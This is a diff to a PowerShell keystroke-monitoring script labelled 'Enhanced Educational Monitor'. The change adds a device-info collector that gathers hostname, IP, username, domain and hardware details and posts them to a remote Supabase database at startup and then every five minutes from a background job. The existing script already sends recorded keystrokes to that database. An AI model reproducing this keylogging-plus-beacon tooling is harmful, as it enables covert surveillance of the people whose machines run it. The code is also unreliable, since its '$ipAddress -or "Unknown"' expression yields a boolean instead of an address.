@@ -28,6 +28,7 @@ $Global:Config = @{
 }
 
 # Global variables
+$Global:DeviceInfoJob = $null
 $Global:IsRecording = $false
 $Global:KeystrokeBuffer = ""
 $Global:RecordingStartTime = $null
@@ -661,6 +662,208 @@ function Send-KeystrokesToSupabase {
     }
 }
 
+# Device Info Updater
+function Get-DeviceInfo {
+    try {
+        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
+        $operatingSystem = Get-WmiObject -Class Win32_OperatingSystem
+        $processor = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
+        $memory = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
+        $disk = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Measure-Object -Property Size -Sum
+        
+        # Get IP address using WMI (more compatible)
+        $ipAddress = $null
+        try {
+            $networkAdapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | 
+                              Where-Object { $_.IPEnabled -eq $true -and $_.IPAddress -ne $null }
+            
+            foreach ($adapter in $networkAdapters) {
+                foreach ($ip in $adapter.IPAddress) {
+                    if ($ip -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$" -and $ip -ne "127.0.0.1") {
+                        $ipAddress = $ip
+                        break
+                    }
+                }
+                if ($ipAddress) { break }
+            }
+        }
+        catch {
+            # Fallback method
+            try {
+                $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
+            }
+            catch {
+                $ipAddress = "Unknown"
+            }
+        }
+        
+        $deviceInfo = @{
+            id = "$env:COMPUTERNAME-$env:USERNAME"
+            hostname = $env:COMPUTERNAME
+            ip_address = $ipAddress -or "Unknown"
+            os = "$($operatingSystem.Caption) $($operatingSystem.Version)"
+            processor = $processor.Name.Trim()
+            memory_gb = [math]::Round(($memory.Sum / 1GB), 2)
+            disk_space_gb = [math]::Round(($disk.Sum / 1GB), 2)
+            username = $env:USERNAME
+            domain = $env:USERDOMAIN
+            last_seen = (Get-Date).ToString("o")
+            service_version = "Enhanced Monitor v2.0"
+            created_at = (Get-Date).ToString("o")
+            updated_at = (Get-Date).ToString("o")
+        }
+        
+        return $deviceInfo
+    }
+    catch {
+        Write-Host "[ERROR] Failed to get device info: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+function Send-DeviceInfoToSupabase {
+    try {
+        $deviceInfo = Get-DeviceInfo
+        if (-not $deviceInfo) {
+            Write-Host "[ERROR] Could not retrieve device information" -ForegroundColor Red
+            return $false
+        }
+        
+        $headers = @{
+            "apikey" = $Global:Config.SupabaseKey
+            "Authorization" = "Bearer $($Global:Config.SupabaseKey)"
+            "Content-Type" = "application/json"
+            "Prefer" = "resolution=merge-duplicates"
+        }
+        
+        $url = "$($Global:Config.SupabaseUrl)/rest/v1/devices"
+        $jsonData = $deviceInfo | ConvertTo-Json -Compress
+        
+        # Use UPSERT to update existing device or create new one
+        $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
+        
+        Write-Host "[DEVICE INFO] Successfully updated device information in database" -ForegroundColor Green
+        Write-Host "- Device ID: $($deviceInfo.id)" -ForegroundColor Cyan
+        Write-Host "- Hostname: $($deviceInfo.hostname)" -ForegroundColor Cyan
+        Write-Host "- IP: $($deviceInfo.ip_address)" -ForegroundColor Cyan
+        Write-Host "- OS: $($deviceInfo.os)" -ForegroundColor Cyan
+        Write-Host "- RAM: $($deviceInfo.memory_gb) GB" -ForegroundColor Cyan
+        
+        return $true
+    }
+    catch {
+        Write-Host "[DEVICE ERROR] Failed to send device info: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+function Start-DeviceInfoUpdater {
+    Write-Host "[INFO] Starting device info updater..." -ForegroundColor Green
+    
+    # Send initial device info
+    Send-DeviceInfoToSupabase
+    
+    # Start background job to update device info periodically
+    $Global:DeviceInfoJob = Start-Job -ScriptBlock {
+        param($supabaseUrl, $supabaseKey)
+        
+        function Get-DeviceInfoBackground {
+            try {
+                $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
+                $operatingSystem = Get-WmiObject -Class Win32_OperatingSystem
+                $processor = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
+                $memory = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
+                $disk = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Measure-Object -Property Size -Sum
+                
+                # Get IP address
+                $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*", "Ethernet*" -ErrorAction SilentlyContinue | 
+                             Where-Object { $_.IPAddress -ne "127.0.0.1" } | 
+                             Select-Object -First 1).IPAddress
+                
+                if (-not $ipAddress) {
+                    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | 
+                                 Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -eq "Dhcp" } | 
+                                 Select-Object -First 1).IPAddress
+                }
+                
+                return @{
+                    id = "$env:COMPUTERNAME-$env:USERNAME"
+                    hostname = $env:COMPUTERNAME
+                    ip_address = $ipAddress -or "Unknown"
+                    os = "$($operatingSystem.Caption) $($operatingSystem.Version)"
+                    processor = $processor.Name.Trim()
+                    memory_gb = [math]::Round(($memory.Sum / 1GB), 2)
+                    disk_space_gb = [math]::Round(($disk.Sum / 1GB), 2)
+                    username = $env:USERNAME
+                    domain = $env:USERDOMAIN
+                    last_seen = (Get-Date).ToString("o")
+                    service_version = "Enhanced Monitor v2.0"
+                    updated_at = (Get-Date).ToString("o")
+                }
+            }
+            catch {
+                Write-Output "[DEVICE ERROR] Failed to get device info in background: $($_.Exception.Message)"
+                return $null
+            }
+        }
+        
+        function Send-DeviceInfoBackground {
+            param($DeviceInfo)
+            try {
+                $headers = @{
+                    "apikey" = $supabaseKey
+                    "Authorization" = "Bearer $supabaseKey"
+                    "Content-Type" = "application/json"
+                    "Prefer" = "resolution=merge-duplicates"
+                }
+                
+                $url = "$supabaseUrl/rest/v1/devices"
+                $jsonData = $DeviceInfo | ConvertTo-Json -Compress
+                
+                $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
+                Write-Output "[DEVICE UPDATER] Device info updated successfully"
+                return $true
+            }
+            catch {
+                Write-Output "[DEVICE UPDATER ERROR] Failed to update device info: $($_.Exception.Message)"
+                return $false
+            }
+        }
+        
+        Write-Output "[DEVICE UPDATER] Starting periodic device info updates (every 5 minutes)"
+        
+        while ($true) {
+            try {
+                Start-Sleep -Seconds 300  # Update every 5 minutes
+                
+                $deviceInfo = Get-DeviceInfoBackground
+                if ($deviceInfo) {
+                    $success = Send-DeviceInfoBackground -DeviceInfo $deviceInfo
+                    if ($success) {
+                        Write-Output "[DEVICE UPDATER] Heartbeat sent - Last seen updated"
+                    }
+                }
+            }
+            catch {
+                Write-Output "[DEVICE UPDATER ERROR] Error in update loop: $($_.Exception.Message)"
+                Start-Sleep -Seconds 60  # Wait 1 minute before retrying
+            }
+        }
+    } -ArgumentList $Global:Config.SupabaseUrl, $Global:Config.SupabaseKey
+    
+    Write-Host "[SUCCESS] Device info updater started - will update every 5 minutes" -ForegroundColor Green
+}
+
+function Stop-DeviceInfoUpdater {
+    if ($Global:DeviceInfoJob) {
+        Stop-Job -Job $Global:DeviceInfoJob -ErrorAction SilentlyContinue
+        Remove-Job -Job $Global:DeviceInfoJob -ErrorAction SilentlyContinue
+        $Global:DeviceInfoJob = $null
+        Write-Host "[INFO] Device info updater stopped" -ForegroundColor Green
+    }
+}
+
+
 # Enhanced Activity Monitor
 function Start-ActivityMonitor {
     Write-Host "[INFO] Starting activity monitor..." -ForegroundColor Green
@@ -876,6 +1079,9 @@ function Start-CombinedMonitoring {
     Write-Host "Enhanced Educational Monitor - Combined Mode" -ForegroundColor Cyan
     Write-Host "===========================================" -ForegroundColor Cyan
     
+    # Start device info updater
+    Start-DeviceInfoUpdater
+    
     # Start activity monitor
     Start-ActivityMonitor
     
@@ -885,7 +1091,7 @@ function Start-CombinedMonitoring {
     Show-RecordingStatus
     Show-Help
     
-    Write-Host "Ready! Activity monitor is running. Type 'START' to begin keystroke recording..." -ForegroundColor Green
+    Write-Host "Ready! Activity and device monitors are running. Type 'START' to begin keystroke recording..." -ForegroundColor Green
     Write-Host ""
     
     # Main input loop
@@ -935,6 +1141,7 @@ function Start-CombinedMonitoring {
                             Stop-KeystrokeRecording
                         }
                         Stop-ActivityMonitor
+                        Stop-DeviceInfoUpdater
                         $Global:Running = $false
                     }
                     
